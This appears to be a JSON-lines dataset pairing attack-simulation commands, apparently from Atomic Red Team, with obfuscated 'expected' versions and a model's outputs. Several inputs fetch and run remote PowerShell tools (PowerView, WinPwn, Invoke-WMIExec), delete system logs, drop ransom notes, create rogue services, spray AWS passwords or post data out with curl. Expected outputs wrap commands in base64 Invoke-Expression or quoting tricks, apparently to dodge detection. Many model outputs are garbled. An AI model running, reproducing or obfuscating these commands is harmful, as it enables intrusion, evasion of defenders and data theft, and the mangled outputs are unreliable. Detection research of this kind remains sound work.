{"input": "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')  \n", "output_expected": "Invoke-Expression Net.WebClient).DownloadString(https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1) (New-Object", "output_model": "Invoke-Execution(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')  Invoke-Exe;cution(New-Obje,ct N"}
{"input": "rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}", "output_expected": "rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgYm9yZGVyICN7dHJ1ZX0=')) | Invoke-Expression\""}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}", "output_expected": "[Net.ServicePointManager]::SecurityProtocol IEX (IWR https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1 -UseBasicParsing);Invoke-WMIExec -Target", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UmVxdWlyZSAtICRNYXRjaGFzczEgLTEpJiAvdjEuMTMuNDcuMDAwOyBtZSBleGVjayAje2hvd2luZyAzNTkuMTAuMDA=')) |"}
{"input": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" EXIT'\n", "output_expected": "bash -c 'trap \"nohup sh $PathT o   At o   mi   c  s   F  ol  der  /  T 1 5   4 6   . 0 05 /src  /   echo-a r   t  -f   ish . s  h   \"    EXIT'", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3NjaGVsbC97bGxpY2FsICRyZXNvbHV0aW9uICdBbm5vdCBleHRlcm4gLVBhcnQgMjAxNTUyMTIzMCAtIGJyb3dzZXIg"}
{"input": "net.exe stop #{service_name}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0LmV4ZSBzdG9wICN7c2VydmljZV9uYW1lfQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxyZXN1bHQtaGVsbCAje3tleSAiIyR0aW1lLVByb2plY3QtcmFuZG9tb3MgICAgIE5hbWUgLSAtIFBsZWFzZSBub25j"}
{"input": "msiexec /quiet /i {PATH:.msi}", "output_expected": "msiexec /quiet /i {PATH:.msi}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0cmlvIC9wZXJtaW5pc3RlbnQgL21ldGFkYXRhIC9jIG1hdHJpeCAtYmx1ZyB7dGVtcGxhdGVzKCAqI3tmaWxlfSB"}
{"input": "Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\ExcelVBAaddin.xlam\" \"$env:APPDATA\\Microsoft\\Excel\\XLSTART\\notepad.xlam\"        \nStart-Process \"Excel\"\n", "output_expected": "Copy \\\"\"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\ExcelVBAaddin.xlam\"\\\" \"$env:APPDATA\\Microsoft\\Excel\\XLSTART\\notepad.xlam\" Start-Process \"Excel\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JG5vbWUgIiN7ZmllbGRzIC97c2luYy9jYXRhbG9nfQ==')) | Invoke-Expression\"\n```"}
{"input": "cd /tmp\ngit clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git\ncd /tmp/GoAWSConsoleSpray\ngo run main.go GoAWSConsoleSpray -a #{aws_account_id} -u PathToAtomicsFolder/T1110.003/src/aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2QgL3RtcApnaXQgY2xvbmUgZ2l0QGdpdGh1Yi5jb206V2hpdGVPYWtTZWN1cml0eS9Hb0FXU0NvbnNvbGVTcHJheS5naXQKY2QgL3RtcC9Hb0FXU0NvbnNvbGVTcHJheQpnbyBydW4gbWFpbi5nbyBHb0FXU0NvbnNvbGVTcHJheSAtYSAje2F3c19hY2NvdW50X2lkfSAtdSBQYXRoVG9BdG9taWNzRm9sZGVyL1QxMTEwLjAwMy9zcmMvYXdzX3VzZXJzLnR4dCAtcCBQYXRoVG9BdG9taWNzRm9sZGVyL1QxMTEwLjAwMy9zcmMvYXdzX3Bhc3N3b3Jkcy50eHQ=')) | Invoke-Expression\"", "output_model": "cd /tmp git clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git cd /tmp/GoAWSConsoleSpray go run main.go GoAWSConsoleSpray -a \"PathToAtomicsFolder/T1110.003/src/aws_users.txt\" -p \"PathToAtomicsFolder/T1110.003/"}
{"input": "msbuild.exe {PATH:.proj}", "output_expected": "msbuild.exe {PATH:\".proj}\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC9Qcml2YWN5fQ==')) | Invoke-Expression\""}
{"input": "tar -xf {PATH}:ads", "output_expected": "tar {PATH}:ads -xf", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje29iamFjdGVyX3R5cGU=')) | Invoke-Expression\""}
{"input": "net share\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0IHNoYXJl')) | Invoke-Expression\"", "output_model": "net \"share\""}
{"input": "swift #{swift_src} -keylog\n", "output_expected": "swift -keylog", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NhbGwgI3tmaWxlX21vZHVsZSB7dGltZXMgaXBzdW0uY29tCiAgLnR4dA==')) | Invoke-Expression\""}
{"input": "rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.dll}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZGxsMzIuZXhlIGllYWR2cGFjay5kbGwsUmVnaXN0ZXJPQ1gge1BBVEg6LmRsbH0=')) | Invoke-Expression\"", "output_model": "rundll32.exe {PATH:.dll},RegisterOCX ieadvpack.dll"}
{"input": "Send-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments \"#{input_file}\" -SmtpServer #{smtp_server}\n", "output_expected": "Send-MailMessage -From", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgLW5ldA==')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')\nInvoke-watson", "output_expected": "iex(new-object Invoke-watson net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1)", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGhvbmV0b2NrIHRoaXMuIC9kZWNyZWF0dFdpdC5zdGFjayAje3toYWlfZGVjb2RlLmNvbTogJ2hlbiAje3toYWlfa"}
{"input": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /d 1 /f\n", "output_expected": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /delete 1 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGRvbWFpbg==')) | Invoke-Expression\""}
{"input": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\nInvoke-ShareFinder #{parameters}\n", "output_expected": "Import-Module PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView Invoke-ShareFinder", "output_model": "powershell -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LW5hbWV9IC97ZXRfcmVxdWVzdC9GYWNlc3QgTmFtZX0KIiAvPiB7eyJpZCI6ImEwMDAifSxcInNvdXJjZV"}
{"input": "echo -n 111-11-1111 | b64encode -r -\ncurl -XPOST #{base64_data}.#{destination_url}\n", "output_expected": "echo -n 111-11-1111 | b64encode -r -\ncurl -XPOST", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBhIHNlc3Npb25zIGFjY2VwdCAtMC4x')) | Invoke-Expression\""}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR; 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin -Verbose", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('W3sgZXhlICRhYmxlIGFzIGV4cGxvdyAje3Byb2NlcmVycyAjcnVubmluZyAtYWNjb3VudCkgeyBidXNpbmcgLXRlbGV0Z"}
{"input": "echo T1486 - Purelocker Ransom Note > %USERPROFILE%\\Desktop\\YOUR_FILES.txt\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBUMTQ4NiAtIFB1cmVsb2NrZXIgUmFuc29tIE5vdGUgPiAlVVNFUlBST0ZJTEUlXERlc2t0b3BcWU9VUl9GSUxFUy50eHQ=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBXaW5kb3dzIHRoaXMgTmFtZSBJbnRQb2xpYiAtcGFyayAjSEFkZCAiUGVuZCBMaWxlfSI=')) | Invoke-Expression\"<|endoftext"}
{"input": "bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Yml0c2FkbWluIC9jcmVhdGUgMSBiaXRzYWRtaW4gL2FkZGZpbGUgMSBodHRwczovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9hdXRvcnVucy5leGUgYzpcZGF0YVxwbGF5Zm9sZGVyXGF1dG9ydW5zLmV4ZSBiaXRzYWRtaW4gL1JFU1VNRSAxIGJpdHNhZG1pbiAvY29tcGxldGUgMQ==')) | Invoke-Expression\"", "output_model": "bitsadmin /CREATE 1 bitsadmin /ADDFILE 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /COMPLETE 1"}
{"input": "Scriptrunner.exe -appvscript {PATH:.exe}", "output_expected": "Scriptrunner.exe \\\"-appvscript\\\" {PATH:.exe}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUJvbGxlY3QgIiN7cm9sZXdzIHNob3cgICAgICAgICB7dGVtcGxhdGUgfSI=')) | Invoke-Expression\""}
{"input": "$excelApp = New-Object -COMObject \"Excel.Application\"\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\n    Write-Host \"64-bit Office\"\n    Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\n}\nelse{\n  Write-Host \"32-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\n}\n$ver = $excelApp.version\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\"\nRemove-Item $ExcelRegPath -ErrorAction Ignore\nNew-Item -type Directory $ExcelRegPath | Out-Null\nNew-ItemProperty $ExcelRegPath OPEN -value \"/R notepad.xll\" -propertyType string | Out-Null\n$excelApp.Quit()\nStart-Process \"Excel\"\n", "output_expected": "$excelApp = New-Object -COMObject Excel.Application if(-not $excelApp.path.contains(\"Program Files (x86)\")){ Write-Host \"64-bit Office\" Copy PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll $env:APPDATA\\Microsoft\\AddIns\\notepad.xll } else{ Write-Host \"32-bit Office\" Copy PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll $env:APPDATA\\Microsoft\\AddIns\\notepad.xll } $ver = $excelApp.version $ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\" Remove-Item $ExcelRegPath -ErrorAction Ignore New-Item -type Directory $ExcelRegPath | Out-Null New-ItemProperty $ExcelRegPath OPEN -value \"/R notepad.xll\" -propertyType string | Out-Null $excelApp.Quit() Start-Process Excel", "output_model": "$excelApp = New-Object -COMObject \"Excel.Application\" if(-not $excelApp.path.contains(\"Program Files (x86)\")) { Write-Host \"64-bit Office\" Copy PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll $env:APPDATA\\Microsoft\\AddIns\\notepad.xll } else { Write-"}
{"input": "New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"\nNew-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCBIS0xNOiJcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cQXBwQ29tcGF0RmxhZ3NcQ3VzdG9tIiAtTmFtZSAiQXRvbWljUmVkVGVhbVQxNTQ2LjAxMSIgLVZhbHVlICJBdG9taWNSZWRUZWFtVDE1NDYuMDExIgpOZXctSXRlbVByb3BlcnR5IC1QYXRoIEhLTE06IlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxBcHBDb21wYXRGbGFnc1xJbnN0YWxsZWRTREIiIC1OYW1lICJBdG9taWNSZWRUZWFtVDE1NDYuMDExIiAtVmFsdWUgIkF0b21pY1JlZFRlYW1UMTU0Ni4wMTEi')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q2hlY2tQcm9maWxlX3RvX2JpbmFyeSIje2lkZW50aWZpZXIgIiN7ZmllbGRzLnBocC5jb21wbGVhcHVzIC9zdG"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nkittenz -consoleoutput -noninteractive", "output_expected": "iex(new\"-object\" net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') kittenz -consoleoutput -noninteractive", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') kittenz -consoleoutput -noninteractive"}
{"input": "cat #{sh_history_filename} | grep #{sh_history_grep_args} > #{output_file}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0ICN7c2hfaGlzdG9yeV9maWxlbmFtZX0gfCBncmVwICN7c2hfaGlzdG9yeV9ncmVwX2FyZ3N9ID4gI3tvdXRwdXRfZmlsZX0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9kZXN0cmljdGlvbnMvRm9ybWF0dGVyVHlwZS5leGUgL1Jvb3Q=')) | Invoke-Expression\""}
{"input": "rm -rf /var/log/messages\nrm -rf /var/log/security\n", "output_expected": "rm -rf /var/log/messages rm -rf \"/var/log/security\"", "output_model": "rm -rf /var/log/messages rm -rf /var/log/security"}
{"input": "Start-Process \"#{Splashtop_Path}\"\n", "output_expected": "Start-Process \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VsZXhpc3RvbGxlcy5leGVjdXRlLmFzcHYgIiAvIC0tPiAje3NvdWxkIC97dXJyb3JfdmlzaW9uX2luIC1wID4+IC"}
{"input": "ilasm.exe {PATH_ABSOLUTE:.txt} /exe", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWxhc20uZXhlIHtQQVRIX0FCU09MVVRFOi50eHR9IC9leGU=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGFja2FnZXN9')) | Invoke-Expression\""}
{"input": "fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE}", "output_expected": "fsutil.exe {PATH_ABSOLUTE} setZeroData offset=0 length=9999999999 file", "output_model": "\"f\"\"s\"\"u\"\"t\"\"i\"\"l\"\"e\"\".\"\"\"f\"\"i\"\"l\"\"e\"\" s\"\"e\"\"t\"\"Z\"\"e\"\"r\"\"o\"\"D\"\"a\"\"t\"\"a\"\" o\"\"f\"\"f\"\"s\"\"e\"\"t=\"\"0\"\" l\"\"e\"\"n\"\"g\"\"th=\"\"9\"\"9\"\"9\"\"9\"\"9\"\"9\"\"9\"\"{PATH_ABSOLUTE}\" =<|endoftext|"}
{"input": "echo '! exec \"/bin/sh &\"' | PERL_MM_USE_DEFAULT=1  cpan", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAnISBleGVjICIvYmluL3NoICYiJyB8IFBFUkxfTU1fVVNFX0RFRkFVTFQ9MSAgY3Bhbg==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBjaGFyIC9wYXNzd29yZC5jcnlwdGVkfQ==')) | Invoke-Expression\""}
{"input": "wmic.exe process call create \"{CMD}\"", "output_expected": "wmic.exe --process --call --create \"{CMD}\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAiL2NvbW1vbiIjeHMiOiJzaGEtcG9ydCAtdGFjay5qcyIsICJ7ZXhlIGRlZmF1bHRfbmQgdGVzdCBkb21haW4uY"}
{"input": "sudo sed -i \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}\n", "output_expected": "sudo \"s\"ed -i \"", "output_model": "sudo sed -i \"^,#{pam_rule}\\n,g\" #{path_to_pam_conf} -- {index}s,^,,g -i^,#{pam_rule"}
{"input": "CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}", "output_expected": "CertReq \\\"-\\\"\\\"P\\\"\\\"o\\\"\\\"s\\\"\\\"t\\\" -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}", "output_model": "CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}"}
{"input": "sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname\n", "output_expected": "sshpass -p 'pwd101!' ssh \\\"testuser1@localhost\\\" -T hostname", "output_model": "sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname"}
{"input": "sed -i '$ a #art_test_1562_006_1' /etc/audisp/#{audisp_config_file_name}\nif [ -f \"/etc/#{auditd_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_1' /etc/#{auditd_config_file_name}\nelse sed -i '$ a #art_test_1562_006_1' /etc/audit/#{auditd_config_file_name}\nfi \nsed -i '$ a #art_test_1562_006_1' /etc/#{libaudit_config_file_name}\n", "output_expected": "sed /etc/audisp/", "output_model": "sed -i $ a #art_test_1562_006_1 /etc/audisp/#{audisp_config_file_name} if [ -f \"/etc/#{auditd_config_file_name}\" ]; then sed -i $ a #art_test_1562_006_1 /etc/#{auditd_config_file_name} else sed -i $ a #art_test"}
{"input": "(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] Domain Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}\n", "output_expected": "(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] Domain Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdF9maWxlIHtQYXJhbUZpbGVuY2llcyAje3Byb2dyZWdhdGVzCmNvbnRlbnQtVHlwZSAje3Byb2dyZWdhdGVzCjE"}
{"input": "netstat\nnet use\nnet sessions\n", "output_expected": "netstat\nnet use\nnet sessions", "output_model": "netstat net use net sessions"}
{"input": "unlink /var/log/messages\n", "output_expected": "unlink /var/log/messages", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFjY291bnRzLmNvZGUgdGVzdCAtcHJvamVjdA==')) | Invoke-Expression\""}
{"input": "copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe\n%SystemRoot%\\Temp\\lsass.exe /B\n", "output_expected": "copy %SystemRoot%\\System32\\cmd %SystemRoot%\\Temp\\lsass.exe %SystemRoot%\\Temp\\lsass.exe /B", "output_model": "copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe %SystemRoot%\\Temp\\lsass.exe /B"}
{"input": "sc create evilservice binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" DisplayName= \"evilservice\" start= auto\\ & sc start evilservice", "output_expected": "sc create evilservice binpath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" displayname= \"evilservice\" start= auto\\ & sc start evilservice", "output_model": "sc create evilservice binPath=\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" DisplayName= \"evilservice\" start= auto& sc start evilservice"}
{"input": "get-ADPrincipalGroupMembership #{user} | select name\n", "output_expected": "get-ADPrincipalGroupMembership", "output_model": "powershell -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG90aGVyX3BhcnRpY2FsLmNvbTppbWFnZV9zaWRlfQ==')) | Invoke-Expression\""}
{"input": "netsh.exe advfirewall  show allprofiles \nnetsh.exe advfirewall firewall dump\nnetsh.exe advfirewall show currentprofile\nnetsh.exe advfirewall firewall show rule name=all\nnetsh.exe firewall show state\nnetsh.exe firewall show config\nsc query windefend\npowershell.exe /c \"Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }\"\npowershell.exe /c \"Get-Service | where-object {$_.DisplayName -like '*sysm*'}\"\npowershell.exe /c \"Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''\"\ntasklist.exe\ntasklist.exe | findstr /i virus\ntasklist.exe | findstr /i cb\ntasklist.exe | findstr /i defender\ntasklist.exe | findstr /i cylance\ntasklist.exe | findstr /i mc\ntasklist.exe | findstr /i \"virus cb defender cylance mc\"\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAbgBlAHQAcwBoAC4AZQB4AGUAIABhAGQAdgBmAGkAcgBlAHcAYQBsAGwAIAAgAHMAaABvAHcAIABhAGwAbABwAHIAbwBmAGkAbABlAHMAIAAKAG4AZQB0AHMAaAAuAGUAeABlACAAYQBkAHYAZgBpAHIAZQB3AGEAbABsACAAZgBpAHIAZQB3AGEAbABsACAAZAB1AG0AcAAKAG4AZQB0AHMAaAAuAGUAeABlACAAYQBkAHYAZgBpAHIAZQB3AGEAbABsACAAcwBoAG8AdwAgAGMAdQByAHIAZQBuAHQAcAByAG8AZgBpAGwAZQAKAG4AZQB0AHMAaAAuAGUAeABlACAAYQBkAHYAZgBpAHIAZQB3AGEAbABsACAAZgBpAHIAZQB3AGEAbABsACAAcwBoAG8AdwAgAHIAdQBsAGUAIABuAGEAbQBlAD0AYQBsAGwACgBuAGUAdABzAGgALgBlAHgAZQAgAGYAaQByAGUAdwBhAGwAbAAgAHMAaABvAHcAIABzAHQAYQB0AGUACgBuAGUAdABzAGgALgBlAHgAZQAgAGYAaQByAGUAdwBhAGwAbAAgAHMAaABvAHcAIABjAG8AbgBmAGkAZwAKAHMAYwAgAHEAdQBlAHIAeQAgAHcAaQBuAGQAZQBmAGUAbgBkAAoAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALwBjACAAIgBHAGUAdAAtAFAAcgBvAGMAZQBzAHMAIAB8ACAAVwBoAGUAcgBlAC0ATwBiAGoAZQBjAHQAIAB7ACAAJABfAC4AUAByAG8AYwBlAHMAcwBOAGEAbQBlACAALQBlAHEAIAAnAFMAeQBzAG0AbwBuACcAIAB9ACIACgBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAvAGMAIAAiAEcAZQB0AC0AUwBlAHIAdgBpAGMAZQAgAHwAIAB3AGgAZQByAGUALQBvAGIAagBlAGMAdAAgAHsAJABfAC4ARABpAHMAcABsAGEAeQBOAGEAbQBlACAALQBsAGkAawBlACAAJwAqAHMAeQBzAG0AKgAnAH0AIgAKAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAgAC8AYwAgACIARwBlAHQALQBDAGkAbQBJAG4AcwB0AGEAbgBjAGUAIABXAGkAbgAzADIAXwBTAGUAcgB2AGkAYwBlACAALQBGAGkAbAB0AGUAcgAgACcARABlAHMAYwByAGkAcAB0AGkAbwBuACAAPQAgACcAJwBTAHkAcwB0AGUAbQAgAE0AbwBuAGkAdABvAHIAIABzAGUAcgB2AGkAYwBlACcAJwAnACIACgB0AGEAcwBrAGwAaQBzAHQALgBlAHgAZQAKAHQAYQBzAGsAbABpAHMAdAAuAGUAeABlACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB2AGkAcgB1AHMACgB0AGEAcwBrAGwAaQBzAHQALgBlAHgAZQAgAHwAIABmAGkAbgBkAHMAdAByACAALwBpACAAYwBiAAoAdABhAHMAawBsAGkAcwB0AC4AZQB4AGUAIAB8ACAAZgBpAG4AZABzAHQAcgAgAC8AaQAgAGQAZQBmAGUAbgBkAGUAcgAKAHQAYQBzAGsAbABpAHMAdAAuAGUAeABlACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIABjAHkAbABhAG4AYwBlAAoAdABhAHMAawBsAGkAcwB0AC4AZQB4AGUAIAB8ACAAZgBpAG4AZABzAHQAcgAgAC8AaQAgAG0AYwAKAHQAYQBzAGsAbABpAHMAdAAuAGUAeABlACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAAiAHYAaQByAHUAcwAgAGMAYgAgAGQAZQBmAGUAbgBkAGUAcgAgAGMAeQBsAGEAbgBjAGUAIABtAGMAIgA=", "output_model": "powershell.exe /c Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' } netsh.exe advfirewall  show 